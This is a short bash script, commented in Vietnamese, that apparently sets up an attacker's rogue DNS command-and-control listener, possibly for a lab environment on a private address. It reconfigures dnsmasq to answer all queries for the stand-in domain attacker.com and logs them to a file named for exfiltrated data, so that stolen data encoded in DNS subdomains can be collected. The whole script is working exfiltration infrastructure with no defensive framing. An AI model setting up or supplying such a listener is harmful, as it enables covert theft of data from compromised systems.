#!/bin/bash
# Rogue DNS C2 Listener tren attacker (172.20.0.5:53).
# Cau hinh dnsmasq tra loi moi truy van *.exfil-EXID.attacker.com ve 127.0.0.1
# va ghi log du lieu da danh cap vao /var/log/exfiltrated_data.log

systemctl stop systemd-resolved 2>/dev/null || true
pkill -f dnsmasq 2>/dev/null || true

cat > /etc/dnsmasq.conf <<EOF
port=53
no-resolv
log-queries
log-facility=/var/log/exfiltrated_data.log
address=/attacker.com/127.0.0.1
EOF

dnsmasq -C /etc/dnsmasq.conf || true

# Duy tri tien trinh ngam
while true; do
  sleep 30
done
